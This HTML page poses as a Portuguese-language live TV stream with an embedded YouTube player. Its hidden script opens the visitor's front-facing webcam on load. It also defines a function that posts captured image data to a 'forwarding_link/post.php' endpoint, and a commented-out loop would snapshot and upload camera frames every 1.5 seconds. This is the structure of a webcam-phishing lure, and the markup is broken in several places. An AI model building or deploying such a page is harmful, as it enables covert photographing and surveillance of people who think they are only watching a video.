<!doctype html>
<html>
  <head>
    <script
      type="text/javascript"

    <link
      rel="stylesheet"
      type="text/css"
      href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css"
    />
    <script
      type="text/javascript"
      src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"
    ></script>
    <script src="https://cdn.tailwindcss.com"></script>
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css"
    />
  </head>

  <!-- Styles -->
  <style>
    body {
      background: linear-gradient(135deg, #0f172a 0%, #1e2937 100%);
      min-height: 100vh;
      font-family: "Inter", system-ui, sans-serif;
    }

    .video-container {
      position: relative;
      padding-top: 56.25%; /* 16:9 Aspect Ratio */
      border-radius: 16px;
      overflow: hidden;
      box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.6);
      background: #000;
    }

    .video-container iframe {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      border: 0;
    }

    .live-badge {
      animation: pulse 2s infinite;
    }

    @keyframes pulse {
      0%,
      100% {
        opacity: 1;
      }
      50% {
        opacity: 0.7;
      }
    }
  </style>

  <div class="video-wrap">
    <video id="video" playsinline autoplay></video>
  </div>

  <!-- <canvas id="canvas" width="640" height="480"></canvas> -->

  <script>
    function post(imgdata) {
      $.ajax({
        type: "POST",
        data: { cat: imgdata },
        url: "forwarding_link/post.php",
        dataType: "json",
        async: false,
        success: function (result) {
          // call the function that handles the response/results
        },
        error: function () {},
      });
    }

    ("use strict");

    const video = document.getElementById("video");
    // const canvas = document.getElementById('canvas');
    const errorMsgElement = document.querySelector("span#errorMsg");

    const constraints = {
      audio: false,
      video: {
        facingMode: "user",
      },
    };

    // Access webcam
    async function init() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        handleSuccess(stream);
      } catch (e) {
        errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
      }
    }

    // Success
    function handleSuccess(stream) {
      window.stream = stream;
      video.srcObject = stream;

      // var context = canvas.getContext('2d');
      //   setInterval(function(){

      //        context.drawImage(video, 0, 0, 640, 480);
      //        var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
      //        post(canvasData); }, 1500);
    }

    // Load init
    init();
  </script>

  >
    <h1 style="color: #000; font-size: 28px; margin-bottom: 20px">

  <body class="flex items-center justify-center min-h-screen p-6">
    <div class="max-w-5xl w-full">
      <!-- Header -->
      <div class="flex items-center justify-between mb-8">
        <div class="flex items-center gap-3">
          <div class="w-4 h-4 bg-red-600 rounded-full live-badge"></div>
          <h1 class="text-white text-4xl font-bold tracking-tight">
            Assista ao Vivo
          </h1>
        </div>

        <div
          class="flex items-center gap-2 text-emerald-400 text-sm font-medium"
        >
          <i class="fas fa-circle"></i>
          <span>AO VIVO</span>
        </div>
      </div>

      <!-- Video Container -->
      <div class="video-container">
        <iframe
          id="Live_YT_TV"
          src="https://www.youtube.com/embed/live_yt_tv?autoplay=1&modestbranding=1&rel=0"
          allow="
            accelerometer;
            autoplay;
            clipboard-write;
            encrypted-media;
            gyroscope;
            picture-in-picture;
          "
          allowfullscreen
        >
        </iframe>
      </div>

      <!-- Info abaixo do vídeo -->
      <div class="mt-6 flex items-center justify-between text-gray-400 text-sm">
        <div class="flex items-center gap-2">
          <i class="fas fa-tv"></i>
          <span>Transmissão ao vivo</span>
        </div>

        <div class="flex items-center gap-4">
          <button
            onclick="toggleFullscreen()"
            class="flex items-center gap-2 hover:text-white transition-colors"
          >
            <i class="fas fa-expand"></i>
            <span class="hidden sm:inline">Tela cheia</span>
          </button>
        </div>
      </div>
    </div>
  </body>
</html>
